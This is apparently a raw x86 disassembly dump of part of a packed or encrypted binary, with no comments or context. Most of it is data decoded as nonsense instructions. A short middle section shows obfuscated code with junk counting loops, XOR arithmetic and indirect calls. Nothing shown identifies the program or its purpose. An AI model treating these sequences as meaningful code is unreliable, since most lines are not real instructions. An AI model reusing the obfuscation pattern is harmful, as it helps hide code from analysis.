  41ce11:	xlat   BYTE PTR ds:[ebx]
  41ce12:	pop    edi
  41ce13:	sub    eax,0x63063ae2
  41ce18:	push   ecx
  41ce19:	xchg   ebp,eax
  41ce1a:	iret   
  41ce1b:	lahf   
  41ce1c:	rcr    BYTE PTR ds:0xa141334a,cl
  41ce22:	inc    ebp
  41ce23:	pmaxub mm2,QWORD PTR [eax]
  41ce26:	dec    eax
  41ce27:	outs   dx,BYTE PTR ds:[esi]
  41ce28:	daa    
  41ce29:	sbb    ch,BYTE PTR [edi]
  41ce2b:	xor    dl,al
  41ce2d:	or     al,0xc0
  41ce2f:	and    dh,dl
  41ce31:	pop    eax
  41ce32:	fs pop ds
  41ce34:	into   
  41ce35:	push   eax
  41ce36:	sub    al,0xb8
  41ce38:	in     eax,dx
  41ce39:	xchg   DWORD PTR [eax-0x46],edi
  41ce3c:	scas   al,BYTE PTR es:[edi]
  41ce3d:	cmp    edi,eax
  41ce3f:	mov    eax,0xeb4bcf2b
  41ce44:	pop    DWORD PTR [eax-0x1344a691]
  41ce4a:	mov    esi,0x7fce6808
  41ce4f:	or     al,0xe2
  41ce51:	xchg   BYTE PTR [ebp+0x6a68e0db],ch
  41ce57:	sub    ebx,ebx
  41ce59:	cmp    al,0xa2
  41ce5b:	cmc    
  41ce5c:	ss popf 
  41ce5e:	mov    eax,0xd505812c
  41ce63:	jae    0x41ce64
  41ce65:	jae    0x41ced8
  41ce67:	push   ss
  41ce68:	fiadd  DWORD PTR [ebp+0x4fe0eb4c]
  41ce6f:	mov    DWORD PTR ds:0x9d54f115,eax
  41ce75:	jp     0x41ce29
  41ce77:	mov    BYTE PTR [eax],cl
  41ce79:	or     bl,dl
  41ce7b:	lods   al,BYTE PTR ds:[esi]
  41ce7c:	and    eax,0x6b40e288
  41ce81:	xor    al,0xf5
  41ce83:	fisttp WORD PTR [edx+ecx*1+0x6513e4da]
  41ce8a:	lods   al,BYTE PTR ds:[esi]
  41ce8b:	loope  0x41cee2
  41ce8d:	mov    ecx,0x5dc4fa28
  41ce92:	sbb    al,0xe0
  41ce94:	dec    ecx
  41ce95:	or     BYTE PTR [ebx+0x7f9813b2],dl
  41ce9b:	xchg   ecx,eax
  41ce9c:	mov    WORD PTR [edi+0x3b],ds
  41ce9f:	push   ebp
  41cea0:	mov    ebx,0xdd0e798e
  41cea5:	add    DWORD PTR [edi],esi
  41cea7:	test   al,0xae
  41cea9:	and    ch,ah
  41ceab:	jns    0x41ced6
  41cead:	jo     0x41cf12
  41ceaf:	or     al,0xd6
  41ceb1:	(bad)  
  41ceb2:	xor    DWORD PTR [edx+0xb],esp
  41ceb5:	mov    eax,ds:0x120e26b5
  41ceba:	adc    DWORD PTR ds:0x6c8416e4,ebp
  41cec0:	mov    esi,0xee75051a
  41cec5:	jl     0x41cf0b
  41cec7:	push   edi
  41cec8:	mov    bh,0xc6
  41ceca:	cwde   
  41cecb:	je     0x41ce52
  41cecd:	in     al,dx
  41cece:	cmp    dl,BYTE PTR [eax+0x12ee867c]
  41ced4:	sbb    dh,0x53
  41ced7:	lds    ebp,FWORD PTR [edi-0x78]
  41ceda:	fistp  WORD PTR [esi-0x282b5a7c]
  41cee0:	ins    DWORD PTR es:[edi],dx
  41cee1:	dec    ebx
  41cee2:	mov    al,ds:0x32098aef
  41cee7:	(bad)  
  41cee8:	call   0x70de:0xc0f37686
  41ceef:	jns    0x41cf4f
  41cef1:	loopne 0x41cf40
  41cef3:	shl    BYTE PTR [ecx-0x3b478010],1
  41cef9:	int    0x5f
  41cefb:	aad    0xe1
  41cefd:	xchg   ebx,eax
  41cefe:	rol    BYTE PTR [edi],cl
  41cf00:	lods   al,BYTE PTR ds:[esi]
  41cf01:	cwde   
  41cf02:	outs   dx,DWORD PTR ds:[esi]
  41cf03:	push   esi
  41cf04:	fucom  st(4)
  41cf06:	cmp    al,0xbe
  41cf08:	cmp    al,0x8b
  41cf0a:	aaa    
  41cf0b:	push   ebp
  41cf0c:	mov    bh,BYTE PTR [eax-0x56748bb5]
  41cf12:	pusha  
  41cf13:	add    al,0x3b
  41cf15:	shr    BYTE PTR [edi-0xd],1
  41cf18:	cs scas eax,DWORD PTR es:[edi]
  41cf1a:	mov    ah,0x8a
  41cf1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cf1d:	and    al,0xa7
  41cf1f:	cmc    
  41cf20:	jae    0x41cea9
  41cf22:	cmp    ecx,DWORD PTR [ebx]
  41cf24:	or     DWORD PTR [eax-0x55],0x265e5191
  41cf2b:	mov    ecx,fs
  41cf2d:	adc    eax,DWORD PTR [ecx+0xc]
  41cf30:	and    DWORD PTR [eax+0x21bac78f],0x9407129d
  41cf3a:	call   0x924d:0x92093e92
  41cf41:	xchg   edx,eax
  41cf42:	idiv   BYTE PTR ds:0xe439e41e
  41cf48:	out    0x7f,al
  41cf4a:	xlat   BYTE PTR ds:[ebx]
  41cf4b:	push   esp
  41cf4c:	or     BYTE PTR ds:0xca6b8620,bh
  41cf52:	and    eax,0x1c6f69d1
  41cf57:	stos   DWORD PTR es:[edi],eax
  41cf58:	scas   al,BYTE PTR es:[edi]
  41cf59:	cwde   
  41cf5a:	adc    DWORD PTR [ebp+0x4b],eax
  41cf5d:	inc    esp
  41cf5e:	repnz test al,0xd9
  41cf61:	inc    edi
  41cf62:	(bad)  
  41cf63:	lea    edi,[edx-0x6f5cd488]
  41cf69:	add    cl,ch
  41cf6b:	retf   0x1571
  41cf6e:	(bad)  
  41cf6f:	sub    ch,BYTE PTR [edx-0x7a]
  41cf72:	cmp    al,0xb0
  41cf74:	ja     0x41cf12
  41cf76:	fwait
  41cf77:	ror    DWORD PTR [eax-0x6b59d0a],0x0
  41cf7e:	mov    ah,BYTE PTR [ebx+ecx*8-0x1b]
  41cf82:	sbb    DWORD PTR fs:[edx-0x52],ecx
  41cf86:	stos   BYTE PTR es:[edi],al
  41cf87:	inc    edi
  41cf88:	cmp    ebp,DWORD PTR [edi+0x6b]
  41cf8b:	aam    0x6d
  41cf8d:	jl     0x41cf0f
  41cf8f:	cmc    
  41cf90:	inc    esp
  41cf91:	sub    BYTE PTR [ecx+ebx*2+0x4],cl
  41cf95:	repnz sbb eax,DWORD PTR [edx]
  41cf98:	jnp    0x41cf93
  41cf9a:	adc    al,0xdc
  41cf9c:	push   eax
  41cf9d:	(bad)  
  41cf9e:	js     0x41cf8b
  41cfa0:	dec    ebp
  41cfa1:	xor    bl,BYTE PTR [esi]
  41cfa3:	dec    ebp
  41cfa4:	mov    cl,BYTE PTR [edi]
  41cfa6:	shl    BYTE PTR [edi],1
  41cfa8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cfa9:	and    BYTE PTR ds:0x628e87a9,al
  41cfaf:	pop    esi
  41cfb0:	add    DWORD PTR [ecx],ebx
  41cfb2:	and    al,0x16
  41cfb4:	xor    ecx,DWORD PTR [esi-0x488c67aa]
  41cfba:	or     edi,esi
  41cfbc:	lea    edi,[ecx-0x3e965c45]
  41cfc2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cfc3:	sub    BYTE PTR gs:[ecx+0x27],cl
  41cfc7:	imul   edi,DWORD PTR [bx],0xdc17537a
  41cfce:	push   ds
  41cfcf:	lock data16 jl 0x41d01a
  41cfd3:	loopne 0x41cf81
  41cfd5:	pop    esp
  41cfd6:	(bad)  
  41cfd8:	in     eax,dx
  41cfd9:	xchg   ebx,eax
  41cfda:	jo     0x41d033
  41cfdc:	inc    edi
  41cfdd:	addr16 inc ecx
  41cfdf:	sub    BYTE PTR [edx-0x6f],ah
  41cfe2:	mov    esp,0xddcb639a
  41cfe7:	hlt    
  41cfe8:	out    0xfc,eax
  41cfea:	push   ecx
  41cfeb:	xchg   edi,eax
  41cfec:	ss call 0xd99a:0x34e2b6de
  41cff4:	push   ss
  41cff5:	and    al,dh
  41cff7:	fist   WORD PTR [ebp+0x5c5b73e5]
  41cffd:	cmp    edx,eax
  41cfff:	xchg   DWORD PTR [esi],ebx
  41d001:	fs sbb cl,bh
  41d004:	fadd   st,st(7)
  41d006:	loopne 0x41cfd5
  41d008:	adc    ebp,edi
  41d00a:	(bad)  
  41d00b:	mov    WORD PTR [ebx],?
  41d00d:	and    esi,ebx
  41d00f:	mov    edi,0x339761da
  41d014:	out    dx,eax
  41d015:	dec    edi
  41d016:	xchg   edi,eax
  41d017:	xchg   edi,eax
  41d018:	adc    dh,BYTE PTR [edx]
  41d01a:	mov    ah,BYTE PTR [eax+0x73]
  41d01d:	call   0x86c7c713
  41d022:	xchg   edx,eax
  41d023:	int    0x9b
  41d025:	cmp    dl,0x26
  41d028:	jle    0x41d03c
  41d02a:	and    eax,DWORD PTR [edx-0x302c27cd]
  41d030:	js     0x41d0af
  41d032:	popa   
  41d033:	or     dl,dh
  41d035:	jnp    0x41cfe4
  41d037:	add    DWORD PTR [ecx],esi
  41d039:	cmp    BYTE PTR [ecx],dh
  41d03b:	xlat   BYTE PTR ds:[ebx]
  41d03c:	xchg   ebp,eax
  41d03d:	inc    edi
  41d03e:	inc    ecx
  41d03f:	(bad)  
  41d040:	test   al,0xf3
  41d042:	sub    eax,0xabf87894
  41d047:	in     al,0xbe
  41d049:	xchg   esi,eax
  41d04a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d04b:	jmp    0x8d80:0x888a12d9
  41d052:	cmp    BYTE PTR [ebx+0x79],ah
  41d055:	fnstcw WORD PTR [edi-0x49]
  41d058:	ins    BYTE PTR es:[edi],dx
  41d059:	nop
  41d05a:	(bad)  
  41d05b:	adc    DWORD PTR [bx+si],ebp
  41d05e:	jb     0x41d0b7
  41d060:	repz adc ecx,ecx
  41d063:	sti    
  41d064:	loopne 0x41d004
  41d066:	or     al,0x24
  41d068:	mov    al,ds:0x935de8d5
  41d06d:	xchg   dh,bh
  41d06f:	and    al,0x8d
  41d071:	clc    
  41d072:	pop    es
  41d073:	sub    ecx,DWORD PTR [esi+0x41]
  41d076:	xchg   esp,eax
  41d077:	xlat   BYTE PTR ds:[ebx]
  41d078:	pop    edi
  41d079:	add    DWORD PTR [esi+0x4d90943d],esp
  41d07f:	ret    0x4675
  41d082:	leave  
  41d083:	jmp    0x803d:0xef9214e7
  41d08a:	or     edi,ecx
  41d08c:	pop    ecx
  41d08d:	xlat   BYTE PTR ds:[ebx]
  41d08e:	icebp  
  41d08f:	mov    esp,0x389da8d0
  41d094:	call   0x83a2:0xfdbf4c57
  41d09b:	mov    ds:0x50906001,al
  41d0a0:	cmp    BYTE PTR [esi-0x61],0xa5
  41d0a4:	or     ebx,esp
  41d0a6:	dec    eax
  41d0a7:	mov    ch,0x50
  41d0a9:	cmp    esp,DWORD PTR ds:0xdf2bcf3f
  41d0af:	test   eax,0x8b89dc98
  41d0b4:	mov    ebp,0x66048b24
  41d0b9:	xchg   ebp,eax
  41d0ba:	jmp    0x41d0da
  41d0bc:	xor    BYTE PTR [ebp+eax*8+0x46],ch
  41d0c0:	push   ecx
  41d0c1:	sub    al,0xd9
  41d0c3:	enter  0x4bf6,0x1e
  41d0c7:	jp     0x41d050
  41d0c9:	mov    cl,0x52
  41d0cb:	mov    ebx,0xba28f2f3
  41d0d0:	sbb    bl,ah
  41d0d2:	push   esp
  41d0d3:	rcr    DWORD PTR [ebx+0x42bd4426],1
  41d0d9:	mov    ds:0xe1187ad1,al
  41d0de:	nop
  41d0df:	and    DWORD PTR ds:[ecx+0x604d899d],edi
  41d0e6:	shl    BYTE PTR [esi-0x4aca315d],cl
  41d0ec:	jne    0x41d158
  41d0ee:	ret    0x9d6c
  41d0f1:	int    0x92
  41d0f3:	or     BYTE PTR [ebp+0x15a12794],dl
  41d0f9:	or     eax,0x7a5cd11b
  41d0fe:	das    
  41d0ff:	ret    0x2fc9
  41d102:	loopne 0x41d119
  41d104:	xor    bl,BYTE PTR [ebp+0x3f83404d]
  41d10a:	aas    
  41d10b:	xor    al,0xda
  41d10d:	pop    edi
  41d10e:	cmp    ecx,edx
  41d110:	inc    esi
  41d111:	push   ebx
  41d112:	xchg   ebx,eax
  41d113:	stos   BYTE PTR es:[edi],al
  41d114:	sahf   
  41d115:	push   0x6c
  41d117:	out    0x73,al
  41d119:	or     ah,dh
  41d11b:	xchg   esi,eax
  41d11c:	xchg   edi,eax
  41d11d:	loopne 0x41d0d9
  41d11f:	push   0x5725244a
  41d124:	or     DWORD PTR [eax+0x4e50f020],ebx
  41d12a:	jmp    DWORD PTR [eax-0x175bc927]
  41d130:	aas    
  41d131:	retf   0xa014
  41d134:	test   BYTE PTR [ebx+edx*1+0x5e],dh
  41d138:	sub    al,BYTE PTR [ebx+0x5a85bf97]
  41d13e:	lock lods eax,DWORD PTR ds:[esi]
  41d140:	pop    ecx
  41d141:	mov    cl,0x9f
  41d143:	imul   esi,DWORD PTR [edx],0xffffffaa
  41d146:	xor    edx,DWORD PTR [esi]
  41d148:	sub    al,BYTE PTR [ebx+0x43]
  41d14b:	dec    ecx
  41d14c:	in     eax,dx
  41d14d:	jne    0x41d176
  41d14f:	jae    0x41d1bb
  41d151:	je     0x41d12e
  41d153:	loop   0x41d16f
  41d155:	cmp    BYTE PTR [ebp+0x6e],0x60
  41d159:	mov    BYTE PTR [ecx-0x163f63a1],cl
  41d15f:	sub    al,0xe6
  41d161:	inc    DWORD PTR [eax-0x713ca374]
  41d167:	mov    dh,0x8e
  41d169:	(bad)  ds:[ecx]
  41d16c:	jae    0x41d17d
  41d16e:	xchg   edx,eax
  41d16f:	mov    bh,BYTE PTR [esi]
  41d171:	out    0x47,al
  41d173:	sub    DWORD PTR [ebx-0x6604acf3],esi
  41d179:	pop    ds
  41d17a:	je     0x41d12f
  41d17c:	retf   
  41d17d:	xor    BYTE PTR [esi+edi*4],0xb1
  41d181:	push   ebx
  41d182:	add    dh,BYTE PTR [edx]
  41d184:	cmp    eax,0xf186c2eb
  41d189:	arpl   WORD PTR [eax],sp
  41d18b:	lock xor al,0x7a
  41d18e:	push   esi
  41d18f:	iret   
  41d190:	xchg   esp,eax
  41d191:	repnz loop 0x41d1ac
  41d194:	mov    ss,WORD PTR [edx]
  41d196:	inc    eax
  41d197:	pop    ebx
  41d198:	out    dx,eax
  41d199:	mov    BYTE PTR [eax-0x2d288caf],dl
  41d19f:	gs clc 
  41d1a1:	sub    DWORD PTR [eax+esi*1-0x70],0xffffff94
  41d1a6:	pushf  
  41d1a7:	stos   BYTE PTR es:[edi],al
  41d1a8:	cld    
  41d1a9:	jle    0x41d1e6
  41d1ab:	push   0x132f9096
  41d1b0:	(bad)  
  41d1b1:	push   eax
  41d1b2:	push   esp
  41d1b3:	cmp    DWORD PTR [ecx],ebx
  41d1b5:	add    bh,dl
  41d1b7:	out    0x35,al
  41d1b9:	ins    DWORD PTR es:[edi],dx
  41d1ba:	or     esp,DWORD PTR [eax]
  41d1bc:	or     eax,DWORD PTR ds:[edi+0x5b]
  41d1c0:	out    0x8f,eax
  41d1c2:	sbb    ah,BYTE PTR [edi]
  41d1c4:	pop    eax
  41d1c5:	in     eax,dx
  41d1c6:	inc    edi
  41d1c7:	dec    edx
  41d1c8:	rcr    BYTE PTR ds:0x6ee0701e,0x8a
  41d1cf:	mov    eax,ds:0x17c7974b
  41d1d4:	dec    ebx
  41d1d5:	in     eax,dx
  41d1d6:	xchg   DWORD PTR [edx*2+0x3d861dbe],ebx
  41d1dd:	add    BYTE PTR [ecx],0x2b
  41d1e0:	or     esp,eax
  41d1e2:	sub    DWORD PTR [eax],eax
  41d1e4:	push   ss
  41d1e5:	fstp   DWORD PTR ds:0xc30eb63e
  41d1eb:	fadd   QWORD PTR [edx-0x33]
  41d1ee:	loope  0x41d1e8
  41d1f0:	pop    eax
  41d1f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d1f2:	out    dx,eax
  41d1f3:	adc    ecx,ecx
  41d1f5:	dec    edx
  41d1f6:	and    al,0xd0
  41d1f8:	fldcw  WORD PTR [ebx-0x39]
  41d1fb:	addr16 (bad) 
  41d1fd:	clc    
  41d1fe:	inc    ebx
  41d1ff:	repz adc eax,DWORD PTR [ebp+0xd178d4b]
  41d206:	ret    
  41d207:	stos   DWORD PTR es:[edi],eax
  41d208:	push   ss
  41d209:	jne    0x41d21c
  41d20b:	std    
  41d20c:	call   0xc5d87594
  41d211:	xchg   BYTE PTR [edx+0x18dac51e],cl
  41d217:	cmp    BYTE PTR [ebx+ebx*8-0xa7e49da],ah
  41d21e:	bound  edi,QWORD PTR [eax]
  41d220:	inc    esi
  41d221:	add    eax,0x568758f5
  41d226:	jl     0x41d229
  41d228:	adc    eax,0x50742265
  41d22d:	mov    ch,0x94
  41d22f:	arpl   WORD PTR [eax],cx
  41d231:	popa   
  41d232:	fstp   TBYTE PTR [ebx+0x67502c50]
  41d238:	adc    ah,ch
  41d23a:	inc    ebx
  41d23b:	pop    edx
  41d23c:	mov    eax,0x6dd011b0
  41d241:	sub    al,0xf9
  41d243:	push   eax
  41d244:	sub    eax,0x2ce9ee33
  41d249:	and    eax,0xee06ff78
  41d24e:	sbb    BYTE PTR ds:0x93f2d475,0x5f
  41d255:	mov    edx,0xb457d59e
  41d25a:	jge    0x41d2cc
  41d25c:	hlt    
  41d25d:	loopne 0x41d205
  41d25f:	push   ds
  41d260:	sbb    edx,ebp
  41d262:	test   DWORD PTR ds:0x77c010a6,ecx
  41d268:	pop    edx
  41d269:	jno    0x41d1fc
  41d26b:	mov    edx,0x74bcd5e6
  41d270:	ds dec ebx
  41d272:	mov    dh,0x11
  41d274:	jnp    0x41d241
  41d276:	in     al,dx
  41d277:	test   BYTE PTR [ecx+0x2fe46edb],bl
  41d27d:	adc    edx,edx
  41d27f:	outs   dx,BYTE PTR ds:[esi]
  41d280:	popf   
  41d281:	out    dx,eax
  41d282:	xor    dl,BYTE PTR [edi-0x67]
  41d285:	xor    al,0x38
  41d287:	mov    esi,0x6e2d2d28
  41d28c:	cmp    ebp,esp
  41d28e:	dec    edx
  41d28f:	scas   eax,DWORD PTR es:[edi]
  41d290:	mov    BYTE PTR [ecx+0x40],ah
  41d293:	(bad)  
  41d295:	pop    ecx
  41d296:	pop    ebx
  41d297:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d298:	and    dh,BYTE PTR [ecx+0x4751e956]
  41d29e:	pop    edx
  41d29f:	push   eax
  41d2a0:	or     dl,dh
  41d2a2:	(bad)  
  41d2a3:	xchg   ebx,eax
  41d2a4:	leave  
  41d2a5:	test   eax,0x8ba98c73
  41d2aa:	xchg   esi,eax
  41d2ab:	dec    edx
  41d2ac:	add    ecx,DWORD PTR [edx+0x3e052544]
  41d2b2:	ins    DWORD PTR es:[edi],dx
  41d2b3:	sbb    al,bl
  41d2b5:	push   0x51
  41d2b7:	or     cl,BYTE PTR [eax+0x6b]
  41d2ba:	mov    bl,0x5f
  41d2bc:	or     DWORD PTR [eax+edx*2-0x66b026ad],0xeac9546e
  41d2c7:	dec    ecx
  41d2c8:	cwde   
  41d2c9:	jbe    0x41d2b6
  41d2cb:	hlt    
  41d2cc:	repz int3 
  41d2ce:	push   0xffffffe1
  41d2d0:	shl    ch,cl
  41d2d2:	dec    esi
  41d2d3:	xchg   ecx,eax
  41d2d4:	stc    
  41d2d5:	xchg   esp,eax
  41d2d6:	pushf  
  41d2d7:	adc    edi,esp
  41d2d9:	rcl    DWORD PTR [esi+0x6f0de93d],1
  41d2df:	or     eax,0xd6f2d329
  41d2e4:	jo     0x41d26a
  41d2e6:	pop    edi
  41d2e7:	xor    al,0x2e
  41d2e9:	xchg   BYTE PTR [edi-0x1490f7a5],cl
  41d2ef:	jns    0x41d2fc
  41d2f1:	retf   0xa2e6
  41d2f4:	int    0x26
  41d2f6:	cli    
  41d2f7:	mov    edi,?
  41d2f9:	mov    esi,0x906e0619
  41d2fe:	aaa    
  41d2ff:	clc    
  41d300:	jno    0x41d2e8
  41d302:	mov    DWORD PTR [esi],ebp
  41d304:	loope  0x41d355
  41d306:	repz mov eax,0xe906c557
  41d30c:	pop    eax
  41d30d:	add    eax,0x41904226
  41d312:	jge    0x41d2c5
  41d314:	push   edx
  41d315:	std    
  41d316:	dec    edi
  41d317:	jle    0x41d2ac
  41d319:	mov    bh,0xb7
  41d31b:	gs mov ebx,0x447561f2
  41d321:	es repz jmp 0x41d2c7
  41d325:	xor    DWORD PTR [eax],0x99e29f45
  41d32b:	sub    ah,ah
  41d32d:	pop    eax
  41d32e:	mov    dh,0x1a
  41d330:	pop    ebx
  41d331:	call   0xb4d45e34
  41d336:	leave  
  41d337:	inc    edx
  41d338:	cmp    DWORD PTR [ecx],esi
  41d33a:	scas   eax,DWORD PTR es:[edi]
  41d33b:	(bad)  
  41d33c:	call   0x2c0:0x987d7f82
  41d343:	mov    ebx,edi
  41d345:	inc    ecx
  41d346:	pop    es
  41d347:	fisubr DWORD PTR [ebx]
  41d349:	stos   BYTE PTR es:[edi],al
  41d34a:	pop    esp
  41d34b:	pop    DWORD PTR [eax+0x22]
  41d34e:	jbe    0x41d3b5
  41d350:	push   esp
  41d351:	int    0x9d
  41d353:	loopne 0x41d3b5
  41d355:	jle    0x41d33d
  41d357:	ins    DWORD PTR es:[edi],dx
  41d358:	mov    bl,0x53
  41d35a:	push   ds
  41d35b:	mov    ah,BYTE PTR [edi-0x68670b36]
  41d361:	fadd   DWORD PTR [eax+edi*8+0x764198df]
  41d368:	add    ecx,edi
  41d36a:	ret    0xe649
  41d36d:	aaa    
  41d36e:	inc    ecx
  41d36f:	jmp    0x8cb5:0x2a338896
  41d376:	cdq    
  41d377:	add    al,0xc3
  41d379:	hlt    
  41d37a:	(bad)  
  41d37b:	or     eax,0x2e96df17
  41d380:	push   0xffffff88
  41d382:	lahf   
  41d383:	push   es
  41d384:	(bad)
  41d387:	lock mov ds:0xd323d703,eax
  41d38d:	mov    DWORD PTR [ebp-0x4c],edx
  41d390:	xor    DWORD PTR ds:0x42a2d2,0x7dd7
  41d39a:	mov    edx,DWORD PTR [ebp+0x8]
  41d39d:	mov    ebx,DWORD PTR [ebp-0x48]
  41d3a0:	lea    edx,[ebx+edx*1+0x241fcdf]
  41d3a7:	mov    DWORD PTR [ebp-0x48],edx
  41d3aa:	mov    edx,DWORD PTR [ebp+0x8]
  41d3ad:	mov    ebx,0xfa5e1524
  41d3b2:	sub    ebx,edx
  41d3b4:	mov    DWORD PTR ds:0x42a27a,0x17
  41d3be:	cmp    DWORD PTR ds:0x42a27a,0x0
  41d3c5:	je     0x41d3ff
  41d3cb:	cmp    DWORD PTR ds:0x42a27a,0x25
  41d3d2:	jge    0x41d3ff
  41d3d8:	jmp    0x41d3ed
  41d3dd:	push   0x42a2be
  41d3e2:	push   0x429181
  41d3e7:	call   DWORD PTR ds:0x42a3ca
  41d3ed:	mov    edx,DWORD PTR ds:0x42a27a
  41d3f3:	dec    edx
  41d3f4:	mov    DWORD PTR ds:0x42a27a,edx
  41d3fa:	jmp    0x41d3be
  41d3ff:	add    ebx,DWORD PTR [ebp-0x44]
  41d402:	and    DWORD PTR ds:0x42a25a,ebx
  41d408:	mov    DWORD PTR [ebp-0x44],ebx
  41d40b:	mov    edx,DWORD PTR [ebp+0x8]
  41d40e:	sub    DWORD PTR ds:0x42a25e,0x69af
  41d418:	xor    edx,eax
  41d41a:	adc    DWORD PTR ds:0x42a2e6,0x774b
  41d424:	add    edx,esi
  41d426:	mov    DWORD PTR ds:0x42a2ae,0x6366
  41d430:	jne    0x418abe
  41d436:	jmp    0x421e4f
  41d43b:	adc    DWORD PTR ds:0x42a2d2,edx
  41d441:	mov    edx,DWORD PTR [ebp-0xc]
  41d444:	sub    DWORD PTR ds:0x42a2ae,0x4e6d
  41d44e:	sub    edx,esi
  41d450:	xor    edx,eax
  41d452:	sbb    DWORD PTR ds:0x42a2c6,0x8d4
  41d45c:	mov    DWORD PTR [ebp-0x5c],edx
  41d45f:	dec    DWORD PTR ds:0x42a2c2
  41d465:	mov    edx,DWORD PTR [ebp-0x10]
  41d468:	xor    DWORD PTR ds:0x42a2a2,0x42a286
  41d472:	mov    ebx,DWORD PTR [ebp-0x8]
  41d475:	and    DWORD PTR ds:0x42a2ca,0x42a292
  41d47f:	xor    edx,eax
  41d481:	xor    ebx,eax
  41d483:	add    DWORD PTR ds:0x42a29a,0x42a2c2
  41d48d:	sub    edx,ebx
  41d48f:	sub    edx,esi
  41d491:	xor    edx,eax
  41d493:	mov    DWORD PTR [ebp-0x10],edx
  41d496:	mov    edx,DWORD PTR [ebp-0x14]
  41d499:	mov    DWORD PTR [ebp+0x8],edx
  41d49c:	jmp    0x41f8db
  41d4a1:	sbb    edx,ebx
  41d4a3:	mov    edx,DWORD PTR [ebp+0x8]
  41d4a6:	sbb    ebx,DWORD PTR ds:0x42a25a
  41d4ac:	mov    ebx,DWORD PTR [ebp-0x8]
  41d4af:	xor    edx,eax
  41d4b1:	xor    ebx,eax
  41d4b3:	or     DWORD PTR ds:0x42a2f6,0x42a266
  41d4bd:	sub    edx,ebx
  41d4bf:	movzx  ebx,BYTE PTR ds:0x42a2a6
  41d4c6:	sbb    ebx,DWORD PTR ds:0x42a262
  41d4cc:	mov    DWORD PTR ds:0x42a2a6,ebx
  41d4d2:	sub    edx,esi
  41d4d4:	xor    edx,eax
  41d4d6:	mov    DWORD PTR [ebp+0x8],edx
  41d4d9:	mov    DWORD PTR ds:0x42a2b2,0x1f
  41d4e3:	cmp    DWORD PTR ds:0x42a2b2,0x0
  41d4ea:	je     0x41d526
  41d4f0:	cmp    DWORD PTR ds:0x42a2b2,0x21
  41d4f7:	jle    0x41d526
  41d4fd:	jmp    0x41d512
  41d502:	push   0x1ea3
  41d507:	push   0x42a29e
  41d50c:	call   DWORD PTR ds:0x42a3ce
  41d512:	xor    edx,edx
  41d514:	xor    edx,DWORD PTR ds:0x42a2b2
  41d51a:	dec    edx
  41d51b:	mov    DWORD PTR ds:0x42a2b2,edx
  41d521:	jmp    0x41d4e3
  41d526:	mov    edx,DWORD PTR [ebp+0x8]
  41d529:	mov    ebx,DWORD PTR [ebp-0x58]
  41d52c:	add    edx,0x5708fa
  41d532:	imul   edx,ebx
  41d535:	mov    DWORD PTR [ebp-0x58],edx
  41d538:	mov    edx,DWORD PTR [ebp+0x8]
  41d53b:	mov    ebx,DWORD PTR [ebp-0x54]
  41d53e:	add    edx,0x64f898
  41d544:	or     edx,ebx
  41d546:	mov    DWORD PTR [ebp-0x54],edx
  41d549:	jmp    0x41f8a1
  41d54e:	in     al,0xd
  41d550:	in     al,0xc4
  41d552:	xchg   BYTE PTR [esi-0x72a2f23c],al
  41d558:	retf   0x9ae7
  41d55b:	cwde   
  41d55c:	iret   
  41d55d:	add    al,0x4d
  41d55f:	fstp   TBYTE PTR [ebx+eax*4+0x46]
  41d563:	pop    esi
  41d564:	add    DWORD PTR [ebx-0x21e9340c],0x61
  41d56b:	dec    ecx
  41d56c:	and    al,0x1b
  41d56e:	dec    edx
  41d56f:	mov    BYTE PTR [edi+esi*4],0x87
  41d573:	mov    dl,0xfe
  41d575:	enter  0x253e,0xb1
  41d579:	ror    DWORD PTR [eax+0x4],1
  41d57c:	pop    edi
  41d57d:	push   ds
  41d57e:	(bad)  
  41d57f:	fst    DWORD PTR [edi+0x42]
  41d582:	(bad)  
  41d583:	jp     0x41d58b
  41d585:	sti    
  41d586:	clc    
  41d587:	scas   al,BYTE PTR es:[edi]
  41d588:	pop    esi
  41d589:	in     al,0x66
  41d58b:	stc    
  41d58c:	push   ecx
  41d58d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d58e:	push   edx
  41d58f:	je     0x41d571
  41d591:	jae    0x41d608
  41d593:	inc    ecx
  41d594:	mov    dh,0xd3
  41d596:	jp     0x41d605
  41d598:	call   0x9f869301
  41d59d:	cmp    BYTE PTR [eax],cl
  41d59f:	loopne 0x41d60b
  41d5a1:	std    
  41d5a2:	gs xchg edx,eax
  41d5a4:	aad    0x78
  41d5a6:	push   ebx
  41d5a7:	adc    DWORD PTR [eax-0x6f7e0708],esp
  41d5ad:	xchg   edx,eax
  41d5ae:	lods   al,BYTE PTR ds:[esi]
  41d5af:	mov    edx,0x8064b761
  41d5b4:	inc    eax
  41d5b5:	leave  
  41d5b6:	pop    edi
  41d5b7:	into   
  41d5b8:	popa   
  41d5b9:	push   cs
  41d5ba:	leave  
  41d5bb:	sti    
  41d5bc:	dec    ax
  41d5be:	mov    bh,0xc8
  41d5c0:	shl    DWORD PTR [esi+0x35],1
  41d5c3:	pop    ebx
  41d5c4:	imul   ebp
  41d5c6:	data16 mov dl,0x22
  41d5c9:	(bad)  
  41d5ca:	fmul   DWORD PTR [edx+0x38179529]
  41d5d0:	xchg   ebp,eax
  41d5d1:	hlt    
  41d5d2:	dec    ecx
  41d5d3:	adc    al,0xec
  41d5d5:	sub    esi,ebx
  41d5d7:	daa    
  41d5d8:	jnp    0x41d620
  41d5da:	lods   al,BYTE PTR ds:[esi]
  41d5db:	jl     0x41d65a
  41d5dd:	out    dx,al
  41d5de:	dec    esp
  41d5df:	popa   
  41d5e0:	sub    ch,BYTE PTR [ecx-0x5f]
  41d5e3:	mov    fs:0xb6c38f80,eax
  41d5e9:	pop    edx
  41d5ea:	cmp    BYTE PTR [ebp+0x39ae03f3],0xbf
  41d5f1:	xchg   ah,al
  41d5f3:	stc    
  41d5f4:	mov    bl,0x3b
  41d5f6:	xchg   ebp,eax
  41d5f7:	lahf   
  41d5f8:	mov    cl,0xe7
  41d5fa:	jnp    0x41d5f0
  41d5fc:	mov    cl,dl
  41d5fe:	call   0xc4fbd34e
  41d603:	xor    BYTE PTR [edi-0x7b],ch
  41d606:	jnp    0x41d596
